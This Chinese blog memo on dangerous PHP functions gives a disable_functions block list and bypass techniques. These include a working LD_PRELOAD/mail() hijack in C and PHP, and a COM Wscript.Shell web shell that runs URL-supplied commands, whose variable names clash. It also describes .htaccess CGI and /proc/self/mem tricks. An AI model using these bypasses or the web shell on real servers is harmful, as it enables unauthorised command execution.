@@ -1,0 +1,217 @@
+<!DOCTYPE html><html lang="zh-Hans"><head><meta name="generator" content="Hexo 3.8.0"><meta http-equiv="content-type" content="text/html; charset=utf-8"><meta content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0" name="viewport"><meta content="yes" name="apple-mobile-web-app-capable"><meta content="black-translucent" name="apple-mobile-web-app-status-bar-style"><meta content="telephone=no" name="format-detection"><meta name="description"><title>PHP 中可以利用的危险的函数 | K0rz3n's Blog</title><link rel="stylesheet" type="text/css" href="/css/style.css?v=0.0.0"><link rel="stylesheet" type="text/css" href="//lib.baomitu.com/normalize/8.0.1/normalize.min.css"><link rel="stylesheet" type="text/css" href="//lib.baomitu.com/pure/1.0.0/pure-min.css"><link rel="stylesheet" type="text/css" href="//lib.baomitu.com/pure/1.0.0/grids-responsive-min.css"><link rel="stylesheet" href="//lib.baomitu.com/font-awesome/4.7.0/css/font-awesome.min.css"><script type="text/javascript" src="//lib.baomitu.com/jquery/3.4.0/jquery.min.js"></script><link rel="icon" mask sizes="any" href="/favicon.ico"><link rel="Shortcut Icon" type="image/x-icon" href="/favicon.ico"><link rel="apple-touch-icon" href="/apple-touch-icon.png"><link rel="apple-touch-icon-precomposed" href="/apple-touch-icon.png"></head><body><div class="body_container"><div id="header"><div class="site-name"><h1 class="hidden">PHP 中可以利用的危险的函数</h1><a id="logo" href="/.">K0rz3n's Blog</a><p class="description">Shell-is-Only-the-Beginning</p></div><div id="nav-menu"><a class="current" href="/."><i class="fa fa-home"> Home</i></a><a href="/archives/"><i class="fa fa-archive"> Archive</i></a><a href="/about/"><i class="fa fa-user"> About</i></a><a href="/atom.xml"><i class="fa fa-rss"> RSS</i></a></div></div><div class="pure-g" id="layout"><div class="pure-u-1 pure-u-md-3-4"><div class="content_container"><div class="post"><h1 class="post-title">PHP 中可以利用的危险的函数</h1><div class="post-meta">Feb 12, 2019<span> | </span><span class="category"><a href="/categories/备忘/">备忘</a></span><script src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js" async></script><span id="busuanzi_container_page_pv"> | <span id="busuanzi_value_page_pv"></span><span> Hits</span></span></div><div class="clear"><div class="toc-article" id="toc"><div class="toc-title">Contents</div><ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#0X00-前言"><span class="toc-number">1.</span> <span class="toc-text">0X00 前言</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0X01-比较全的-disable-functions"><span class="toc-number">2.</span> <span class="toc-text">0X01 比较全的 disable_functions</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-system"><span class="toc-number">2.1.</span> <span class="toc-text">1.system</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-shell-exec"><span class="toc-number">2.2.</span> <span class="toc-text">2.shell_exec</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3-passthru"><span class="toc-number">2.3.</span> <span class="toc-text">3.passthru</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#4-exec"><span class="toc-number">2.4.</span> <span class="toc-text">4.exec</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#5-popen"><span class="toc-number">2.5.</span> <span class="toc-text">5.popen()</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#6-proc-open"><span class="toc-number">2.6.</span> <span class="toc-text">6.proc_open()</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#7-pcntl-exec"><span class="toc-number">2.7.</span> <span class="toc-text">7.pcntl_exec()</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#8-mail-第五个参数-excrt-cmd"><span class="toc-number">2.8.</span> <span class="toc-text">8.mail()//第五个参数 excrt_cmd</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#9-putenv"><span class="toc-number">2.9.</span> <span class="toc-text">9.putenv()</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#10-assert"><span class="toc-number">2.10.</span> <span class="toc-text">10.assert</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#11-dl"><span class="toc-number">2.11.</span> <span class="toc-text">11.dl()</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#12-symlink"><span class="toc-number">2.12.</span> <span class="toc-text">12.symlink</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#13-link"><span class="toc-number">2.13.</span> <span class="toc-text">13.link</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#14-ini-set-ini-alter"><span class="toc-number">2.14.</span> <span class="toc-text">14.ini_set()/ini_alter()</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#15-imap-mail"><span class="toc-number">2.15.</span> <span class="toc-text">15.imap_mail</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#16-其他函数"><span class="toc-number">2.16.</span> <span class="toc-text">16.其他函数</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#1-chroot"><span class="toc-number">2.16.1.</span> <span class="toc-text">(1)chroot()</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#2-scandir"><span class="toc-number">2.16.2.</span> <span class="toc-text">(2)scandir()</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#3-chgrp"><span class="toc-number">2.16.3.</span> <span class="toc-text">(3)chgrp()</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#4-chown"><span class="toc-number">2.16.4.</span> <span class="toc-text">(4)chown()</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#5-proc-get-status"><span class="toc-number">2.16.5.</span> <span class="toc-text">(5)proc_get_status()</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#6-error-log"><span class="toc-number">2.16.6.</span> <span class="toc-text">(6)error_log()</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#7-ini-restore"><span class="toc-number">2.16.7.</span> <span class="toc-text">(7)ini_restore()</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#8-pfsockopen"><span class="toc-number">2.16.8.</span> <span class="toc-text">(8)pfsockopen()</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#9-syslog"><span class="toc-number">2.16.9.</span> <span class="toc-text">(9)syslog()</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#10-readlink"><span class="toc-number">2.16.10.</span> <span class="toc-text">(10)readlink()</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#11-stream-socket-server"><span class="toc-number">2.16.11.</span> <span class="toc-text">(11)stream_socket_server()</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#12-openlog"><span class="toc-number">2.16.12.</span> <span class="toc-text">(12)openlog</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0X02-一些-bypass-disable-function"><span class="toc-number">3.</span> <span class="toc-text">0X02 一些 bypass disable function</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#一、-htaccess-不只是重定向"><span class="toc-number">3.1.</span> <span class="toc-text">一、.htaccess 不只是重定向</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#二、COM-组件执行命令"><span class="toc-number">3.2.</span> <span class="toc-text">二、COM 组件执行命令</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#三、内核绕过"><span class="toc-number">3.3.</span> <span class="toc-text">三、内核绕过</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0X03-总结"><span class="toc-number">4.</span> <span class="toc-text">0X03 总结</span></a></li></ol></div></div><div class="post-content"><h2 id="0X00-前言"><a href="#0X00-前言" class="headerlink" title="0X00 前言"></a><strong>0X00 前言</strong></h2><p>本文主要对 PHP 中的 disable_functions 以及一些可能会遭到利用的函数做一个罗列，并简单解释。</p>
+<h2 id="0X01-比较全的-disable-functions"><a href="#0X01-比较全的-disable-functions" class="headerlink" title="0X01 比较全的 disable_functions"></a><strong>0X01 比较全的 disable_functions</strong></h2><pre><code>system,shell_exec,passthru,exec,popen,proc_open,pcntl_exec,mail,putenv,apache_setenv,mb_send_mail,assert,dl,set_time_limit,ignore_user_abort,symlink,link,map_open,imap_mail,ini_set,ini_alter,其他函数
+</code></pre><h3 id="1-system"><a href="#1-system" class="headerlink" title="1.system"></a><strong>1.system</strong></h3><p><strong>原型：</strong></p>
+<pre><code>system ( string $command [, int &amp;$return_var ] )
+</code></pre><p><strong>描述：</strong></p>
+<p>同 C 版本的 system() 函数一样， 本函数执行 command 参数所指定的命令， 并且输出执行结果。</p>
+<p>如果 PHP 运行在服务器模块中， system() 函数还会尝试在每行输出完毕之后， 自动刷新 web 服务器的输出缓存。</p>
+<p>如果要获取一个命令未经任何处理的 原始输出， 请使用 passthru() 函数。</p>
+<a id="more"></a>
+<p><strong>参数：</strong></p>
+<p>command<br>要执行的命令。</p>
+<p>return_var<br>如果提供 return_var 参数， 则外部命令执行后的返回状态将会被设置到此变量中。</p>
+<p><strong>返回值：</strong></p>
+<p>成功则返回命令输出的最后一行， 失败则返回 FALSE</p>
+<h3 id="2-shell-exec"><a href="#2-shell-exec" class="headerlink" title="2.shell_exec"></a><strong>2.shell_exec</strong></h3><p><strong>原型：</strong></p>
+<pre><code>shell_exec ( string $cmd )
+</code></pre><p><strong>描述：</strong></p>
+<p>通过 shell 环境执行命令，并且将完整的输出以字符串的方式返回。</p>
+<p><strong>返回值：</strong></p>
+<p>命令执行的输出。 如果执行过程中发生错误或者进程不产生输出，则返回 NULL。</p>
+<blockquote>
+<p><strong>注意：</strong>本函数和 <code></code>(反引号等价)</p>
+</blockquote>
+<h3 id="3-passthru"><a href="#3-passthru" class="headerlink" title="3.passthru"></a><strong>3.passthru</strong></h3><p><strong>原型：</strong></p>
+<pre><code>passthru ( string $command [, int &amp;$return_var ] )
+</code></pre><p><strong>描述：</strong></p>
+<p>同 exec() 函数类似， passthru() 函数 也是用来执行外部命令（command）的。 当所执行的 Unix 命令输出二进制数据， 并且需要直接传送到浏览器的时候， 需要用此函数来替代 exec() 或 system() 函数。 常用来执行诸如 pbmplus 之类的可以直接输出图像流的命令。 通过设置 Content-type 为 image/gif， 然后调用 pbmplus 程序输出 gif 文件， 就可以从 PHP 脚本中直接输出图像到浏览器。</p>
+<p><strong>参数:</strong></p>
+<p>command<br>要执行的命令。</p>
+<p>return_var<br>如果提供 return_var 参数， Unix 命令的返回状态会被记录到此参数。</p>
+<p><strong>返回值:</strong></p>
+<p>没有返回值。</p>
+<h3 id="4-exec"><a href="#4-exec" class="headerlink" title="4.exec"></a><strong>4.exec</strong></h3><p><strong>原型：</strong></p>
+<pre><code>exec ( string $command [, array &amp;$output [, int &amp;$return_var ]] ) 
+</code></pre><p><strong>参数：</strong></p>
+<p>command<br>要执行的命令。</p>
+<p>output<br>如果提供了 output 参数， 那么会用命令执行的输出填充此数组， 每行输出填充数组中的一个元素。 数组中的数据不包含行尾的空白字符，例如 \n 字符。 请注意，如果数组中已经包含了部分元素，exec() 函数会在数组末尾追加内容。如果你不想在数组末尾进行追加， 请在传入 exec() 函数之前 对数组使用 unset() 函数进行重置。</p>
+<p>return_var<br>如果同时提供 output 和 return_var 参数， 命令执行后的返回状态会被写入到此变量。</p>
+<p><strong>返回值：</strong></p>
+<p>命令执行结果的最后一行内容</p>
+<h3 id="5-popen"><a href="#5-popen" class="headerlink" title="5.popen()"></a><strong>5.popen()</strong></h3><p><strong>原型：</strong></p>
+<pre><code>resource popen ( string command, string mode )
+</code></pre><p><strong>描述：</strong></p>
+<p>打开一个指向进程的管道，该进程由派生给定的 command 命令执行而产生。 返回一个和 fopen() 所返回的相同的文件指针，只不过它是单向的（只能用于读或写）并且必须用 pclose() 来关闭。此指针可以用于 fgets()，fgetss() 和 fwrite()。</p>
+<p><strong>例子:</strong></p>
+<pre><code>1：$fd = popen(&quot;command&quot;, &apos;r&apos;); $ret = fgets($fd);
+2：$fd = popen(&quot;systeminfo &gt;d:\\1.txt&quot;, &apos;r&apos;); pclose($fd);print(fgets(fopen(&quot;d:\\1.txt&quot;,&apos;r&apos;)));
+3：$fd=popen(&quot;ipconfig&quot;,&apos;r&apos;);
+while($s=fgets($fd)){
+print_r($s);
+}
+</code></pre><p><strong>注意：</strong></p>
+<p>只能打开单向管道，不是’r’就是’w’；并且需要使用pclose()来关闭。</p>
+<h3 id="6-proc-open"><a href="#6-proc-open" class="headerlink" title="6.proc_open()"></a><strong>6.proc_open()</strong></h3><p><strong>原型：</strong></p>
+<pre><code>resource proc_open ( string cmd, array descriptorspec, array &amp;pipes [, string cwd [, array env [, array other_options]]] )
+</code></pre><p><strong>描述：</strong>与popen类似，但是可以提供双向管道。具体的参数读者可 以自己翻阅php manual</p>
+<p><strong>注意：</strong></p>
+<p>A. 后面需要使用proc_close()关闭资源，并且如果是pipe类型，需要用pclose()关闭句柄。<br>B. proc_open打开的程序作为php的子进程，php退出后该子进程也会退出。</p>
+<p><strong>例子：</strong></p>
+<pre><code>&lt;?php
+$descriptorspec=array( //这个索引数组用力指定要用proc_open创建的子进程的描述符
+0=&gt;array(&apos;pipe&apos;,&apos;r&apos;), //STDIN
+1=&gt;array(&apos;pipe&apos;,&apos;w&apos;),//STDOUT
+2=&gt;array(&apos;pipe&apos;,&apos;w&apos;) //STDERROR
+);
+$handle=proc_open(&apos;dir&apos;,$descriptorspec,$pipes,NULL);
+//$pipes中保存的是子进程创建的管道对应到 PHP 这一端的文件指针($descriptorspec指定的)
+if(!is_resource($handle)){
+die(&apos;proc_open failed&apos;);
+}
+//fwrite($pipes[0],&apos;ipconfig&apos;);
+print(&apos;stdout:&lt;br/&gt;&apos;);
+while($s=fgets($pipes[1])){
+print_r($s);
+}
+print(&apos;===========&lt;br/&gt;stderr:&lt;br/&gt;&apos;);
+while($s=fgets($pipes[2])){
+print_r($s);
+}
+fclose($pipes[0]);
+fclose($pipes[1]);
+fclose($pipes[2]);
+proc_close($handle);
+?&gt;
+</code></pre><h3 id="7-pcntl-exec"><a href="#7-pcntl-exec" class="headerlink" title="7.pcntl_exec()"></a><strong>7.pcntl_exec()</strong></h3><p><strong>原型：</strong></p>
+<pre><code>void pcntl_exec ( string $path [, array $args [, array $envs ]] )
+</code></pre><p><strong>描述：</strong></p>
+<p>(PHP 4 &gt;= 4.2.0, PHP 5, PHP 7)<br>pcntl_exec — 在当前进程空间执行以给定参数执行指定程序。<br>pcntl是linux下的一个扩展，可以支持php的多线程操作。</p>
+<p><strong>参数:</strong></p>
+<p>path: 必须是可执行二进制文件路径或一个在文件第一行指定了一个可执行文件路径<br>标头的脚本（比如文件第一行是#!/usr/local/bin/perl的perl脚本）。 更多的<br>信息请查看您系统的execve（2）手册。<br>args: 一个要传递给程序的参数的字符串数组。<br>envs: 一个要传递给程序作为环境变量的字符串数组。这个数组是 key =&gt; value格<br>式的，key代表要传递的环境变量的名称，value代表该环境变量值。</p>
+<p><strong>返回值:</strong></p>
+<p>当发生错误时返回 FALSE ，没有错误时没有返回。</p>
+<h3 id="8-mail-第五个参数-excrt-cmd"><a href="#8-mail-第五个参数-excrt-cmd" class="headerlink" title="8.mail()//第五个参数 excrt_cmd"></a><strong>8.mail()//第五个参数 excrt_cmd</strong></h3><p>大致就是说，第五个参数支持添加附加的命令作为发送邮件时候的配置，比如使用-f参数可以设置邮件发件人等。</p>
+<p>如果传递了第五个参数（extra_cmd），则用spprintf将sendmail_path和extra_cmd拼接到sendmail_cmd中，随后将sendmail_cmd丢给popen执行，如果系统默认sh是bash，popen会派生bash进程，而我们刚才提到的bash 破壳漏洞，直接就导致我们可以利用mail()函数执行任意命令，绕过disable_functions的限制</p>
+<p><strong>注意：</strong></p>
+<p>但是如果使用了php_escape_shell_cmd函数会对特殊字符（包括&amp;#;`|*?~&lt;&gt;^()[]{}$\, \x0A and \xFF. ‘ 等）进行转义，们可以通过putenv函数来设置一个包含自定义函数的环境变量，然后通过mail()来触发</p>
+<p><strong>详细分析：</strong><br><a href="https://www.leavesongs.com/PHP/php-bypass-disable-functions-by-CVE-2014-6271.html" target="_blank" rel="noopener">https://www.leavesongs.com/PHP/php-bypass-disable-functions-by-CVE-2014-6271.html</a><br><a href="https://www.cnblogs.com/hookjoy/p/8988862.html" target="_blank" rel="noopener">https://www.cnblogs.com/hookjoy/p/8988862.html</a></p>
+<h3 id="9-putenv"><a href="#9-putenv" class="headerlink" title="9.putenv()"></a><strong>9.putenv()</strong></h3><pre><code>bool putenv ( string $setting )
+</code></pre><p>添加 setting 到服务器环境变量,环境变量仅存活于当前请求期间,在请求结束时环境会恢复到初始状态。 既然能自定义环境变量，那么对攻击者就很有利了，</p>
+<p>比如：</p>
+<p><strong>LD_PRELOAD</strong>是Linux系统的下一个有趣的环境变量，它允许你定义在程序运行前优先加载的动态链接库</p>
+<blockquote>
+<p>这个功能主要就是用来有选择性的载入不同动态链接库中的相同函数。通过这个环境变量，我们可以在主程序和其动态链接库的中间加载别的动态链接库，甚至覆盖正常的函数库。一方面，我们可以以此功能来使用自己的或是更好的函数（无需别人的源码），而另一方面，我们也可以以向别人的程序注入程序，从而达到特定的目的。</p>
+</blockquote>
+<p><strong>它允许你定义在程序运行前优先加载的动态链接库</strong>，这说明我们几乎可以劫持PHP的大部分函数，还拿上面的mail函数作为例子，上文说过，php的mail函数实际上是调用了系统的sendmail命令，我们选取一个库函数geteuid</p>
+<p>首先我们编写一个自己的动态链接程序，hack.c：</p>
+<pre><code>#include&lt;stdlib.h&gt;
+#include &lt;stdio.h&gt;        
+#include&lt;string.h&gt; 
+
+void payload() {
+        system(&quot;touch/var/www/html/test&quot;);
+}   
+
+int  geteuid() {
+if(getenv(&quot;LD_PRELOAD&quot;) == NULL) { return 0; }
+unsetenv(&quot;LD_PRELOAD&quot;);
+payload();
+}
+</code></pre><p>当这个共享库中的geteuid被调用时，尝试加载payload()函数，执行命令，在/var/www/html目录下创建一个名字为test的文件。这里实际应用时应该注意编译平台和目标尽量相近，以及注意路径问题，避免不必要的麻烦，这里我们仅仅作为测试，不考虑这些问题。</p>
+<pre><code>[root@localhostadmin]# gcc -c -fPIC hack.c -o hack
+[root@localhostadwin]# gcc -shared hack -o hack.so
+</code></pre><p><strong>我们把hack.so放到WEB目录，然后编写一个PHP文件进行测试：</strong></p>
+<pre><code>&lt;?php
+putenv(&quot;LD_PRELOAD=/var/www/html/hack.so&quot;);
+mail(&quot;admin@localhost&quot;,&quot;&quot;,&quot;&quot;,&quot;&quot;,&quot;&quot;);
+?&gt;
+</code></pre><p>我们的/var/www/html/目录下本来只有hack.so和index.php这两个文件，当我们在浏览器中访问index.php页面之后，可以看到目录下又多出了一个test文件，说明我们的系统命令执行成功。</p>
+<h3 id="10-assert"><a href="#10-assert" class="headerlink" title="10.assert"></a><strong>10.assert</strong></h3><p><strong>原型：</strong></p>
+<pre><code>assert ( mixed $assertion [, string $description ] )
+</code></pre><p><strong>描述：</strong></p>
+<p>如果assertion 是字符串，它将会被 assert() 当做 PHP 代码来执行。</p>
+<h3 id="11-dl"><a href="#11-dl" class="headerlink" title="11.dl()"></a><strong>11.dl()</strong></h3><p>dl()函数允许在php脚本里动态加载php模块，<strong>默认是加载extension_dir目录里的扩展，</strong>该选项是PHP_INI_SYSTEM范围可修改的，只能在php.ini或者apache主配置文件里修改。当然，你也可以通过enable_dl选项来关闭动态加载功能，而这个选项默认为On的，事实上也很少人注意到这个<strong>。dl()函数在设计时存在安全漏洞，可以用../这种目录遍历的方式指定加载任何一个目录里的so等扩展文件</strong>，extension_dir限制可以被随意饶过。所以我们可以上传自己的so文件，并<strong>且用dl函数加载这个so文件然后利用so文件里的函数执行其他操作，包括系统命令。</strong></p>
+<h3 id="12-symlink"><a href="#12-symlink" class="headerlink" title="12.symlink"></a><strong>12.symlink</strong></h3><p><strong>原型：</strong></p>
+<pre><code>symlink ( string $target , string $link )
+</code></pre><p><strong>描述：</strong></p>
+<p>symlink() 对于已有的 target 建立一个名为 link 的符号连接。</p>
+<p><strong>参数：</strong></p>
+<p>target<br>连接的目标。</p>
+<p>link<br>连接的名称。</p>
+<p><strong>返回值：</strong><br>成功时返回 TRUE， 或者在失败时返回 FALSE。</p>
+<blockquote>
+<p><strong>注意：</strong> 该函数仅针对 Windows：运行 PHP 于Vista、Server 2008 或更高版本才能正常使用。 之前版本的 Windows 不支持符号连接。</p>
+</blockquote>
+<h3 id="13-link"><a href="#13-link" class="headerlink" title="13.link"></a><strong>13.link</strong></h3><p><strong>原型：</strong></p>
+<pre><code>link ( string $target , string $link ) 
+</code></pre><p><strong>描述：</strong></p>
+<p>link() 建立一个硬连接。</p>
+<p><strong>参数：</strong></p>
+<p>target<br>要链接的目标。</p>
+<p>link<br>链接的名称。</p>
+<p><strong>返回值：</strong></p>
+<p>成功时返回 TRUE， 或者在失败时返回 FALSE。</p>
+<blockquote>
+<p><strong>注意：</strong></p>
+<p>Windows下：该功能需要以 elevated 模式运行，或者关闭 UAC。</p>
+</blockquote>
+<h3 id="14-ini-set-ini-alter"><a href="#14-ini-set-ini-alter" class="headerlink" title="14.ini_set()/ini_alter()"></a><strong>14.ini_set()/ini_alter()</strong></h3><p><strong>原型：</strong></p>
+<pre><code>ini_set ( string $varname , string $newvalue )
+</code></pre><p><strong>描述：</strong></p>
+<p>设置指定配置选项的值。这个选项会在脚本运行时保持新的值，并在脚本结束时恢复。</p>
+<p><strong>参数：</strong></p>
+<p>varname<br>不是所有有效的选项都能够用 ini_set() 来改变的。 这里有个有效选项的清单附录。</p>
+<p>newvalue<br>选项新的值。</p>
+<p><strong>返回值：</strong></p>
+<p>成功时返回旧的值，失败时返回 FALSE。</p>
+<blockquote>
+<p><strong>注意：</strong></p>
+<p>ini_alter() 是 ini_set()的别名函数</p>
+</blockquote>
+<h3 id="15-imap-mail"><a href="#15-imap-mail" class="headerlink" title="15.imap_mail"></a><strong>15.imap_mail</strong></h3><p>一个 bypass disable_functions 的方法 <a href="https://github.com/Bo0oM/PHP_imap_open_exploit" target="_blank" rel="noopener">https://github.com/Bo0oM/PHP_imap_open_exploit</a></p>
+<h3 id="16-其他函数"><a href="#16-其他函数" class="headerlink" title="16.其他函数"></a><strong>16.其他函数</strong></h3><p>这些函数在某些特定的 情况下还是有一定的攻击性的，选择性禁用就好了</p>
+<h4 id="1-chroot"><a href="#1-chroot" class="headerlink" title="(1)chroot()"></a><strong>(1)chroot()</strong></h4><p>功能描述：可改变当前 PHP 进程的工作根目录，仅当系统支持 CLI 模式PHP 时才能工作，且该函数不适用于 Windows 系统。</p>
+<h4 id="2-scandir"><a href="#2-scandir" class="headerlink" title="(2)scandir()"></a><strong>(2)scandir()</strong></h4><p>功能描述：列出指定路径中的文件和目录。</p>
+<h4 id="3-chgrp"><a href="#3-chgrp" class="headerlink" title="(3)chgrp()"></a><strong>(3)chgrp()</strong></h4><p>功能描述：改变文件或目录所属的用户组。</p>
+<h4 id="4-chown"><a href="#4-chown" class="headerlink" title="(4)chown()"></a><strong>(4)chown()</strong></h4><p>功能描述：改变文件或目录的所有者。</p>
+<h4 id="5-proc-get-status"><a href="#5-proc-get-status" class="headerlink" title="(5)proc_get_status()"></a><strong>(5)proc_get_status()</strong></h4><p>功能描述：获取使用 proc_open() 所打开进程的信息。</p>
+<h4 id="6-error-log"><a href="#6-error-log" class="headerlink" title="(6)error_log()"></a><strong>(6)error_log()</strong></h4><p>功能描述：将错误信息发送到指定位置（文件）。<br>安全备注：在某些版本的 PHP 中，可使用 error_log() 绕过 PHP safe mode，<br>执行任意命令。</p>
+<h4 id="7-ini-restore"><a href="#7-ini-restore" class="headerlink" title="(7)ini_restore()"></a><strong>(7)ini_restore()</strong></h4><p>功能描述：可用于恢复 PHP 环境配置参数到其初始值。</p>
+<h4 id="8-pfsockopen"><a href="#8-pfsockopen" class="headerlink" title="(8)pfsockopen()"></a><strong>(8)pfsockopen()</strong></h4><p>功能描述：建立一个 Internet 或 UNIX 域的 socket 持久连接。</p>
+<h4 id="9-syslog"><a href="#9-syslog" class="headerlink" title="(9)syslog()"></a><strong>(9)syslog()</strong></h4><p>功能描述：可调用 UNIX 系统的系统层 syslog() 函数。</p>
+<h4 id="10-readlink"><a href="#10-readlink" class="headerlink" title="(10)readlink()"></a><strong>(10)readlink()</strong></h4><p>功能描述：返回符号连接指向的目标文件内容。</p>
+<h4 id="11-stream-socket-server"><a href="#11-stream-socket-server" class="headerlink" title="(11)stream_socket_server()"></a><strong>(11)stream_socket_server()</strong></h4><p>功能描述：建立一个 Internet 或 UNIX 服务器连接。</p>
+<h4 id="12-openlog"><a href="#12-openlog" class="headerlink" title="(12)openlog"></a><strong>(12)openlog</strong></h4><p>功能描述：为程序打开与系统记录器的连接。</p>
+<blockquote>
+<p><strong>补充：</strong></p>
+<p>l3m0n 师傅的 disable_functions shell<br>安利一波：<a href="https://github.com/l3m0n/Bypass_Disable_functions_Shell" target="_blank" rel="noopener">https://github.com/l3m0n/Bypass_Disable_functions_Shell</a></p>
+</blockquote>
+<h2 id="0X02-一些-bypass-disable-function"><a href="#0X02-一些-bypass-disable-function" class="headerlink" title="0X02 一些 bypass disable function"></a><strong>0X02 一些 bypass disable function</strong></h2><p>网上找了找 bypass 的方法,当然都属于比较极端的方式，利用条件苛刻，而且几乎都被 disable 了，要我说最有可能的还是 imap (也就是上面的第15点)，但还是列一下，开阔一下思路也是好的，更多信息可以看<a href="https://github.com/l3m0n/Bypass_Disable_functions_Shell" target="_blank" rel="noopener">https://github.com/l3m0n/Bypass_Disable_functions_Shell</a> 。</p>
+<h3 id="一、-htaccess-不只是重定向"><a href="#一、-htaccess-不只是重定向" class="headerlink" title="一、.htaccess 不只是重定向"></a><strong>一、.htaccess 不只是重定向</strong></h3><p><strong>条件：</strong></p>
+<p>第一，必须是apache环境<br>第二，mod_cgi已经启用<br>第三，必须允许.htaccess文件，也就是说在httpd.conf中，要注意AllowOverride选项为All，而不是none<br>第四，必须有权限写.htaccess文件</p>
+<p>在apache的配置中，有一个非常重要的指令，Options，Options指令是Apache配置文件中一个比较常见也比较重要的指令，Options指令可以在Apache服务器核心配置(server config)、虚拟主机配置(virtual host)、特定目录配置(directory)以及.htaccess文件中使用，<strong>Options指令的主要作用是控制特定目录将启用哪些服务器特性我们用到的就是ExecCGI选项，表示允许使用mod_cgi模块执行CGI脚本</strong></p>
+<p>除了Options，我们还要配合另外一个<strong>AddHandler指令</strong>来使用，如果你对AddHandler不太熟悉没关系，这么解释一下就容易理解多了：AddType我们肯定很熟悉，比如配置apache对PHP的支持的时候，经常会添加一行类似AddType application/x-httpd-php .php这样的配置，这其实是指定了文件扩展名和内容类型之间的映射关系，而AddHandler则是指定扩展名和处理程序之间的关系，也就是说，可以指定某个特定的扩展名的文件，如何来进行处理。</p>
+<p>有了Options和AddHandler，我们就可以随便指定一个特定的文件扩展名以特定的程序来处理，这样思路就很清晰了：<strong>先把要执行的程序写入一个特定扩展名的文件里，然后修改.htaccess文件，通过Options指令允许使用mod_cgi模块执行CGI脚本，然后再让我们特定的扩展名以cgi-script进行处理，这样我们甚至可以反弹一个shell出来。</strong></p>
+<p><strong>详细分析：</strong><br><a href="https://www.cnblogs.com/hookjoy/p/8988862.html" target="_blank" rel="noopener">https://www.cnblogs.com/hookjoy/p/8988862.html</a></p>
+<h3 id="二、COM-组件执行命令"><a href="#二、COM-组件执行命令" class="headerlink" title="二、COM 组件执行命令"></a><strong>二、COM 组件执行命令</strong></h3><p>漏洞出现的原因是由于在安全模式下的PHP平台虽然system();passthru()函数被禁止,但是com.allow_dcom的设置依旧是为true.以至于攻击者可以使用COM()函数创建系统组件对象来运行系统命令.如果是默认的Apache设置或者Web服务器以Loacalsystem权限或Administrators权限运行,攻击者可以使用这个漏洞来提升权限.</p>
+<p><strong>exp :</strong></p>
+<pre><code>/*需要Windows Script Host 5.6支持*/
+&lt;?php
+$phpwsh=new COM(&quot;Wscript.Shell&quot;) or die(&quot;Create Wscript.Shell Failed!&quot;);//生成com 对象
+$phpexec=$phpwsh-&gt;exec(&quot;cmd.exe /c $cmd&quot;);//调用 com 对象的方法执行命令
+$execoutput=$wshexec-&gt;stdout();
+$result=$execoutput-&gt;readall();
+echo $result;
+?&gt;
+
+/*Windows Script Host 5.6以下版本支持*/
+&lt;?php
+$phpwsh=new COM(&quot;Wscript.Shell&quot;) or die(&quot;Create Wscript.Shell Failed!&quot;);
+$phpwsh-&gt;run(&quot;cmd.exe /c $cmd &gt; c://inetpub//wwwroot//result.txt&quot;);
+?&gt;
+
+将以上代码保存成*.php文件之后可以在浏览器中执行
+http://www.target.com/simple.php?cmd=[Command]
+</code></pre><h3 id="三、内核绕过"><a href="#三、内核绕过" class="headerlink" title="三、内核绕过"></a><strong>三、内核绕过</strong></h3><p>使用fopen/fread/fwrite函数来操纵内存文件/proc/self/mem。利用这种方法，人们就可以用system()函数的地址来替换GOT中open()函数的地址，这样的话，攻击者就可以通过readfile()函数来随心所欲地执行任意os命令了。</p>
+<h2 id="0X03-总结"><a href="#0X03-总结" class="headerlink" title="0X03 总结"></a><strong>0X03 总结</strong></h2><p>攻与防是相对的，这些函数可以说是给攻击者参考也可以说是给防御者参考吧~另外我在某网站的 disable_functions 里面还看到了一个神奇的函数—-&gt; popepassthru,在网上看到了很多有关 disable_functions 的文章里也写了这个函数,结果我在手册里面都没找到，不知道是不是我太笨了，还是谁自己创造出来的，然后所有人都复制过去了，如果真的是这样的话，只能说明有的开发人员也只是盲目的相信网上的结论然后ctrl+c,ctrl+v，完全不思考一下,也就是说要是恰好文章里有个笔误把 passthru 写成了 pasthru 就很有趣了，我猜测是这样的，还请各位师傅们指教。</p>
